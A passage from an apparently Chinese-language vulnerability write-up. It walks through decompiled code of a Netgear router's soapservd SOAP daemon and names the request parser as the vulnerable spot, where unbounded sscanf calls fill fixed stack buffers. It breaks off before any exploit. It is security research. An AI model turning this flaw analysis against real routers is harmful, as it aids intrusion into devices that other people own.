log_log(<span class="number">3</span>, <span class="string">&quot;soap_main&quot;</span>, <span class="number">628</span>, <span class="string">&quot;initialize_listen_socket failed, errno=%d(%s)&quot;</span>, v6, v7);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fcntl(v4, <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">  optval.__fds_bits[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( setsockopt(v5, <span class="number">1</span>, <span class="number">2</span>, &amp;optval, <span class="number">4u</span>) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = <span class="string">&quot;setsockopt&quot;</span>;</span><br><span class="line">LABEL_10:</span><br><span class="line">    perror(v9);</span><br><span class="line">    close(v5);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(addr, <span class="string">&quot;\\n&quot;</span>);</span><br><span class="line">  *(_WORD *)&amp;addr[<span class="number">2</span>] = __rev16((<span class="type">unsigned</span> <span class="type">int</span>)serverport);</span><br><span class="line">  v10 = in6addr_any.in6_u.u6_addr32[<span class="number">1</span>];</span><br><span class="line">  v11 = in6addr_any.in6_u.u6_addr32[<span class="number">2</span>];</span><br><span class="line">  v12 = in6addr_any.in6_u.u6_addr32[<span class="number">3</span>];</span><br><span class="line">  *(_DWORD *)&amp;addr[<span class="number">8</span>] = in6addr_any.in6_u.u6_addr32[<span class="number">0</span>];</span><br><span class="line">  *(_DWORD *)&amp;addr[<span class="number">12</span>] = v10;</span><br><span class="line">  *(_DWORD *)&amp;addr[<span class="number">16</span>] = v11;</span><br><span class="line">  *(_DWORD *)&amp;addr[<span class="number">20</span>] = v12;</span><br><span class="line">  <span class="keyword">if</span> ( bind(v5, (<span class="type">const</span> <span class="keyword">struct</span> sockaddr *)addr, <span class="number">0x1C</span>u) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = <span class="string">&quot;bind&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( listen(v5, <span class="number">10</span>) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = <span class="string">&quot;listen&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">  &#125;</span><br><span class="line">  v13 = dword_49448;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    ++v3;</span><br><span class="line">    v14 = <span class="built_in">memset</span>(v13, <span class="number">0</span>, <span class="number">0x5C</span>u);</span><br><span class="line">    *v14 = <span class="number">-1</span>;</span><br><span class="line">    v13 = v14 + <span class="number">23</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v3 != <span class="number">64</span> );</span><br><span class="line">  sub_5898(v14, v15, <span class="number">-1</span>, v13);</span><br><span class="line">  v63 = <span class="number">1</span> &lt;&lt; (v5 &amp; <span class="number">0x1F</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">LABEL_18:</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v16 = <span class="number">0</span>;</span><br><span class="line">        v17 = &amp;unk_49450;</span><br><span class="line">        v18 = <span class="number">0</span>;</span><br><span class="line">        v19 = <span class="number">0</span>;</span><br><span class="line">        v20 = time(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( *(v17 - <span class="number">2</span>) != <span class="number">-1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v21 = *(v17 - <span class="number">1</span>);</span><br><span class="line">            ++v18;</span><br><span class="line">            <span class="keyword">if</span> ( v20 &gt; v21 &amp;&amp; v20 - v21 &gt; <span class="number">300</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v61 = *(v17 - <span class="number">2</span>);</span><br><span class="line">              <span class="built_in">memset</span>(v17, <span class="number">0</span>, <span class="number">0x2E</span>u);</span><br><span class="line">              *(v17 - <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">              ++v16;</span><br><span class="line">              log_log(<span class="number">7</span>, <span class="string">&quot;close_timeout_client&quot;</span>, <span class="number">204</span>, <span class="string">&quot;client conn_fd %d close from slot %d&quot;</span>, v61, v19);</span><br><span class="line">              close(*(v17 - <span class="number">2</span>));</span><br><span class="line">              *(v17 - <span class="number">2</span>) = <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          ++v19;</span><br><span class="line">          v17 += <span class="number">23</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v19 != <span class="number">64</span> );</span><br><span class="line">        log_log(</span><br><span class="line">          <span class="number">5</span>,</span><br><span class="line">          <span class="string">&quot;close_timeout_client&quot;</span>,</span><br><span class="line">          <span class="number">212</span>,</span><br><span class="line">          <span class="string">&quot;Use Clients:[%d], Timeout Clients:[%d], Empty Clients:[%d]&quot;</span>,</span><br><span class="line">          v18,</span><br><span class="line">          v16,</span><br><span class="line">          <span class="number">64</span> - v18);</span><br><span class="line">        p_optval = &amp;optval;</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">0</span>; i != <span class="number">32</span>; ++i )</span><br><span class="line">        &#123;</span><br><span class="line">          p_optval-&gt;__fds_bits[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">          p_optval = (fd_set *)((<span class="type">char</span> *)p_optval + <span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        v24 = v5;</span><br><span class="line">        v25 = _fdelt_chk(v5, <span class="number">0</span>, p_optval);</span><br><span class="line">        v27 = <span class="number">1</span> &lt;&lt; (v5 &amp; <span class="number">0x1F</span>);</span><br><span class="line">        optval.__fds_bits[v25] |= v63;</span><br><span class="line">        v28 = dword_49448;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( *v28 != <span class="number">-1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v29 = _fdelt_chk(*v28, v26, v27);</span><br><span class="line">            v26 = *v28 &amp; <span class="number">0x1F</span>;</span><br><span class="line">            v30 = &amp;v77[<span class="number">4</span> * v29 + <span class="number">92</span>];</span><br><span class="line">            <span class="keyword">if</span> ( *v28 &lt;= <span class="number">0</span> )</span><br><span class="line">              v26 = -(-*v28 &amp; <span class="number">0x1F</span>);</span><br><span class="line">            <span class="keyword">if</span> ( v24 &lt; *v28 )</span><br><span class="line">              v24 = *v28;</span><br><span class="line">            v27 = *((_DWORD *)v30 - <span class="number">134</span>) | (<span class="number">1</span> &lt;&lt; v26);</span><br><span class="line">            *((_DWORD *)v30 - <span class="number">134</span>) = v27;</span><br><span class="line">          &#125;</span><br><span class="line">          v28 += <span class="number">23</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v28 != &amp;dword_4AB48 );</span><br><span class="line">        v62 = select(v24 + <span class="number">1</span>, &amp;optval, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v62 != <span class="number">-1</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( dword_4823C )</span><br><span class="line">        &#123;</span><br><span class="line">          log_log(<span class="number">5</span>, <span class="string">&quot;soap_main&quot;</span>, <span class="number">661</span>, <span class="string">&quot;received signal %d, terminate soapservd&quot;</span>, dword_4823C);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_37;</span><br><span class="line">        &#125;</span><br><span class="line">        v33 = *_errno_location();</span><br><span class="line">        v34 = strerror(v33);</span><br><span class="line">        log_log(<span class="number">3</span>, <span class="string">&quot;soap_main&quot;</span>, <span class="number">666</span>, <span class="string">&quot;error on select, errno=%d(%s)&quot;</span>, v33, v34);</span><br><span class="line">        usleep(<span class="number">0x64</span>u);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( (v63 &amp; optval.__fds_bits[_fdelt_chk(v5, v31, v32)]) == <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">memset</span>(v74, <span class="number">0</span>, <span class="number">46</span>);</span><br><span class="line">      fd = accept(v5, (<span class="keyword">struct</span> sockaddr *)addr, &amp;addr_len);</span><br><span class="line">      <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v35 = *_errno_location();</span><br><span class="line">        v36 = strerror(v35);</span><br><span class="line">        log_log(<span class="number">3</span>, <span class="string">&quot;soap_main&quot;</span>, <span class="number">678</span>, <span class="string">&quot;accept failed with errno=%d(%s)&quot;</span>, v35, v36);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_37;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">memset</span>(v75, <span class="number">0</span>, <span class="number">46</span>);</span><br><span class="line">      inet_ntop(<span class="number">10</span>, &amp;addr[<span class="number">8</span>], (<span class="type">char</span> *)v75, <span class="number">0x2E</span>u);</span><br><span class="line">      log_log(<span class="number">7</span>, <span class="string">&quot;soap_main&quot;</span>, <span class="number">687</span>, <span class="string">&quot;client IPv6 ip=%s&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)v75);</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strchr</span>((<span class="type">const</span> <span class="type">char</span> *)v75, <span class="number">46</span>) &amp;&amp; <span class="built_in">strstr</span>((<span class="type">const</span> <span class="type">char</span> *)v75, <span class="string">&quot;:ffff:&quot;</span>) )</span><br><span class="line">        v37 = <span class="built_in">strrchr</span>((<span class="type">const</span> <span class="type">char</span> *)v75, <span class="number">58</span>) + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v37 = (<span class="type">char</span> *)v75;</span><br><span class="line">      _strcpy_chk(v74, v37, <span class="number">46</span>);</span><br><span class="line">      log_log(<span class="number">7</span>, <span class="string">&quot;soap_main&quot;</span>, <span class="number">707</span>, <span class="string">&quot;client ip=%s&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)v74);</span><br><span class="line">      <span class="keyword">if</span> ( a1 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( cmsUtl_strcmp(v74, <span class="string">&quot;127.0.0.1&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( cmsNet_getLanInfo(<span class="string">&quot;br0&quot;</span>, &amp;in, v68) || (v50 = inet_ntoa(in), cmsUtl_strcmp(v74, v50)) )</span><br><span class="line">          &#123;</span><br><span class="line">            log_log(<span class="number">3</span>, <span class="string">&quot;soap_main&quot;</span>, <span class="number">730</span>, <span class="string">&quot;Reject this client (IP address is %s)&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)v74);</span><br><span class="line">            close(fd);</span><br><span class="line">            fd = <span class="number">-1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      v38 = fd;</span><br><span class="line">      <span class="keyword">if</span> ( fd != <span class="number">-1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">memset</span>(v77, <span class="number">0</span>, <span class="number">0x58</span>u);</span><br><span class="line">        v76 = fd;</span><br><span class="line">        v39 = <span class="number">0</span>;</span><br><span class="line">        _strcpy_chk(&amp;v77[<span class="number">4</span>], v74, <span class="number">46</span>);</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v40 = &amp;dword_49448[<span class="number">23</span> * v39];</span><br><span class="line">          <span class="keyword">if</span> ( *v40 == <span class="number">-1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            *v40 = v38;</span><br><span class="line">            v40[<span class="number">1</span>] = time(<span class="number">0</span>);</span><br><span class="line">            _strcpy_chk(&amp;dword_49448[<span class="number">23</span> * v39 + <span class="number">2</span>], &amp;v77[<span class="number">4</span>], <span class="number">46</span>);</span><br><span class="line">            log_log(</span><br><span class="line">              <span class="number">7</span>,</span><br><span class="line">              <span class="string">&quot;add_client&quot;</span>,</span><br><span class="line">              <span class="number">145</span>,</span><br><span class="line">              <span class="string">&quot;new client conn_fd %d (%s) inserted at slot %d at %ld&quot;</span>,</span><br><span class="line">              v76,</span><br><span class="line">              &amp;v77[<span class="number">4</span>],</span><br><span class="line">              v39,</span><br><span class="line">              v40[<span class="number">1</span>]);</span><br><span class="line">            log_log(<span class="number">7</span>, <span class="string">&quot;soap_main&quot;</span>, <span class="number">743</span>, <span class="string">&quot;accepted new client at fd=%d, use select to detect first data&quot;</span>, fd);</span><br><span class="line">            fd = <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_53;</span><br><span class="line">          &#125;</span><br><span class="line">          ++v39;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v39 != <span class="number">64</span> );</span><br><span class="line">        log_log(<span class="number">3</span>, <span class="string">&quot;add_client&quot;</span>, <span class="number">152</span>, <span class="string">&quot;could not insert new client fd %d, MAX_SOAPSERVERD_CLIENT_FDS=%d&quot;</span>, v38, <span class="number">64</span>);</span><br><span class="line">        log_log(<span class="number">3</span>, <span class="string">&quot;soap_main&quot;</span>, <span class="number">749</span>, <span class="string">&quot;fd is full, so delete an fd with the longest time\\n&quot;</span>);</span><br><span class="line">        v51 = <span class="number">31</span>;</span><br><span class="line">        v52 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          --v51;</span><br><span class="line">          v52 *= <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v51 );</span><br><span class="line">        v53 = v52 - <span class="number">1</span>;</span><br><span class="line">        log_log(<span class="number">7</span>, <span class="string">&quot;replace_client&quot;</span>, <span class="number">225</span>, <span class="string">&quot;timestamp is %ld&quot;</span>, v53);</span><br><span class="line">        v54 = dword_49448;</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j != <span class="number">64</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( *v54 != <span class="number">-1</span> &amp;&amp; v54[<span class="number">1</span>] &lt; v53 )</span><br><span class="line">          &#123;</span><br><span class="line">            v53 = v54[<span class="number">1</span>];</span><br><span class="line">            v51 = j;</span><br><span class="line">          &#125;</span><br><span class="line">          v54 += <span class="number">23</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v51 &lt;= <span class="number">63</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v56 = &amp;dword_49448[<span class="number">23</span> * v51];</span><br><span class="line">          close(*v56);</span><br><span class="line">          *v56 = v76;</span><br><span class="line">          v56[<span class="number">1</span>] = time(<span class="number">0</span>);</span><br><span class="line">          _strcpy_chk(&amp;dword_49448[<span class="number">23</span> * v51 + <span class="number">2</span>], &amp;v77[<span class="number">4</span>], <span class="number">46</span>);</span><br><span class="line">          log_log(</span><br><span class="line">            <span class="number">5</span>,</span><br><span class="line">            <span class="string">&quot;replace_client&quot;</span>,</span><br><span class="line">            <span class="number">245</span>,</span><br><span class="line">            <span class="string">&quot;Replace client conn_fd %d (%s) inserted at slot %d at %ld&quot;</span>,</span><br><span class="line">            v76,</span><br><span class="line">            &amp;v77[<span class="number">4</span>],</span><br><span class="line">            v51,</span><br><span class="line">            v56[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        fd = <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_53:</span><br><span class="line">      ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v62 &lt;= <span class="number">1</span> );</span><br><span class="line">    v41 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(v73, <span class="number">0</span>, <span class="number">0x2E</span>u);</span><br><span class="line">    v44 = dword_49448;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v44 != <span class="number">-1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v45 = _fdelt_chk(*v44, v42, v43);</span><br><span class="line">        v46 = *v44;</span><br><span class="line">        v47 = *v44 &amp; <span class="number">0x1F</span>;</span><br><span class="line">        <span class="keyword">if</span> ( *v44 &lt;= <span class="number">0</span> )</span><br><span class="line">          v47 = -(-*v44 &amp; <span class="number">0x1F</span>);</span><br><span class="line">        v43 = optval.__fds_bits[v45];</span><br><span class="line">        <span class="keyword">if</span> ( (v43 &amp; (<span class="number">1</span> &lt;&lt; v47)) != <span class="number">0</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      ++v41;</span><br><span class="line">      v44 += <span class="number">23</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v41 == <span class="number">64</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        log_log(<span class="number">5</span>, <span class="string">&quot;find_and_activate_client_ip&quot;</span>, <span class="number">585</span>, <span class="string">&quot;Could not find any active client fd&#x27;s, ignoring&quot;</span>);</span><br><span class="line">        log_log(<span class="number">3</span>, <span class="string">&quot;soap_main&quot;</span>, <span class="number">767</span>, <span class="string">&quot;Cannot figure out which fd is set!!  Abort and exit.&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_37;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fd = *v44;</span><br><span class="line">    _strcpy_chk(v73, &amp;dword_49448[<span class="number">23</span> * v41 + <span class="number">2</span>], <span class="number">46</span>);</span><br><span class="line">    log_log(<span class="number">7</span>, <span class="string">&quot;find_and_activate_client_ip&quot;</span>, <span class="number">580</span>, <span class="string">&quot;find IP [%s] and handle [%d]&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)v73, v46);</span><br><span class="line">    log_log(<span class="number">7</span>, <span class="string">&quot;soap_main&quot;</span>, <span class="number">771</span>, <span class="string">&quot;=== start service of conn_fd=%d ===&quot;</span>, fd);</span><br><span class="line">    v69[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    v69[<span class="number">1</span>] = &amp;unk_493E0;</span><br><span class="line">    setsockopt(fd, <span class="number">1</span>, <span class="number">20</span>, v69, <span class="number">8u</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !sub_8F20(fd) )</span><br><span class="line">    &#123;</span><br><span class="line">      v48 = _errno_location();</span><br><span class="line">      log_log(<span class="number">3</span>, <span class="string">&quot;soap_main&quot;</span>, <span class="number">787</span>, <span class="string">&quot;fdopen failed with errno=%d&quot;</span>, *v48);</span><br><span class="line">      v49 = sub_4ED0(fd);</span><br><span class="line">      sub_8F78(v49);</span><br><span class="line">      fd = <span class="number">-1</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_52F0(v73);</span><br><span class="line">    v57 = sub_8F50(&amp;fd);</span><br><span class="line">    <span class="keyword">if</span> ( dword_48240 != <span class="number">5</span> )</span><br><span class="line">      sub_8F9C(v57);</span><br><span class="line">    v58 = sub_4ED0(fd);</span><br><span class="line">    sub_8F78(v58);</span><br><span class="line">    fd = <span class="number">-1</span>;</span><br><span class="line">    v59 = dword_48240 == <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> ( dword_48240 != <span class="number">4</span> )</span><br><span class="line">      v59 = dword_48240 == <span class="number">1</span>;</span><br><span class="line">    v60 = v59;</span><br><span class="line">    <span class="keyword">if</span> ( v59 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( dword_48240 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">goto</span> LABEL_37;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">goto</span> LABEL_87;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">goto</span> LABEL_37;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        dword_48240 = v60;</span><br><span class="line">        system(<span class="string">&quot;/usr/sbin/ntgr_speedtest.sh &amp;&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( dword_48240 == <span class="number">7</span> )</span><br><span class="line">LABEL_87:</span><br><span class="line">    data_Restoredefault(<span class="string">&quot;SOAP_SERVER&quot;</span>, <span class="number">5000</span>, <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( dword_48240 == <span class="number">1</span> )</span><br><span class="line">    data_Reboot(<span class="string">&quot;SOAP_SERVER&quot;</span>, <span class="number">5000</span>, <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">LABEL_37:</span><br><span class="line">  close(v5);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>初始化Socket，绑定端口，监听连接</p>
<p>使用select监听客户端连接，接受连接请求</p>
<p>对于有数据的连接，接收并处理SOAP请求</p>
<p>sub_52F0函数则是对SOAP请求进行解析，而漏洞点也发生在这里</p>
<p>定期扫描并关闭超时的连接</p>
<p>跟进sub_52F0函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">sub_52F0</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v2; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">size_t</span> v6; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> *v7; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">size_t</span> v10; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v11; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> *v12; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> line[<span class="number">512</span>]; <span class="comment">// [sp+24h] [bp-FDCh] BYREF</span></span><br><span class="line">  <span class="type">int</span> method[<span class="number">512</span>]; <span class="comment">// [sp+824h] [bp-7DCh] BYREF</span></span><br><span class="line">  <span class="type">char</span> path[<span class="number">2048</span>]; <span class="comment">// [sp+1024h] [bp+24h] BYREF</span></span><br><span class="line">  <span class="type">char</span> protocol[<span class="number">2048</span>]; <span class="comment">// [sp+1824h] [bp+824h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v17[<span class="number">2048</span>]; <span class="comment">// [sp+2024h] [bp+1024h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v18[<span class="number">2052</span>]; <span class="comment">// [sp+2824h] [bp+1824h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(line, <span class="number">0</span>, <span class="keyword">sizeof</span>(line));</span><br><span class="line">  <span class="built_in">memset</span>(method, <span class="number">0</span>, <span class="keyword">sizeof</span>(method));</span><br><span class="line">  <span class="built_in">memset</span>(path, <span class="number">0</span>, <span class="keyword">sizeof</span>(path));</span><br><span class="line">  <span class="built_in">memset</span>(protocol, <span class="number">0</span>, <span class="keyword">sizeof</span>(protocol));</span><br><span class="line">  <span class="built_in">memset</span>(v17, <span class="number">0</span>, <span class="keyword">sizeof</span>(v17));</span><br><span class="line">  <span class="built_in">memset</span>(v18, <span class="number">0</span>, <span class="number">2048</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !sub_8EF0(line) )</span><br><span class="line">  &#123;</span><br><span class="line">    log_log(<span class="number">7</span>, <span class="string">&quot;handle_soapRequest&quot;</span>, <span class="number">384</span>, <span class="string">&quot;line:[%s]&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)line);</span><br><span class="line">    v2 = <span class="string">&quot;No request found.&quot;</span>;</span><br><span class="line">LABEL_3:</span><br><span class="line">    sub_8AC4(<span class="number">400</span>, <span class="string">&quot;Bad Request&quot;</span>, <span class="number">0</span>, v2);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( _isoc99_sscanf(line, <span class="string">&quot;%[^ ] %[^ ] %[^ ]&quot;</span>, method, path, protocol) != <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    log_log(<span class="number">7</span>, <span class="string">&quot;handle_soapRequest&quot;</span>, <span class="number">400</span>, <span class="string">&quot;method:[%s], path:[%s], protocol:[%s]&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)method, path, protocol);</span><br><span class="line">    v2 = <span class="string">&quot;Can&#x27;t parse request.&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( strcasecmp((<span class="type">const</span> <span class="type">char</span> *)method, <span class="string">&quot;post&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    log_log(<span class="number">7</span>, <span class="string">&quot;handle_soapRequest&quot;</span>, <span class="number">407</span>, <span class="string">&quot;Received method is [%s].&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)method);</span><br><span class="line">    v2 = <span class="string">&quot;That method is not handled by us.&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_5044(a1);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( sub_8EF0(line) == <span class="number">1</span> &amp;&amp; cmsUtl_strcmp(line, <span class="string">&quot;\\n&quot;</span>) &amp;&amp; cmsUtl_strcmp(line, <span class="string">&quot;\\r\\n&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = cmsUtl_strlen(<span class="string">&quot;SOAPAction:&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( cmsUtl_strncasecmp(line, <span class="string">&quot;SOAPAction:&quot;</span>, v5) )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = <span class="built_in">strstr</span>((<span class="type">const</span> <span class="type">char</span> *)line, <span class="string">&quot;Content-Length:&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 = cmsUtl_strlen(<span class="string">&quot;Content-Length: &quot;</span>);</span><br><span class="line">        v9 = atoi(&amp;v7[v8]);</span><br><span class="line">        log_log(<span class="number">7</span>, <span class="string">&quot;handle_soapRequest&quot;</span>, <span class="number">438</span>, <span class="string">&quot;Content-Length:[%d]&quot;</span>, v9);</span><br><span 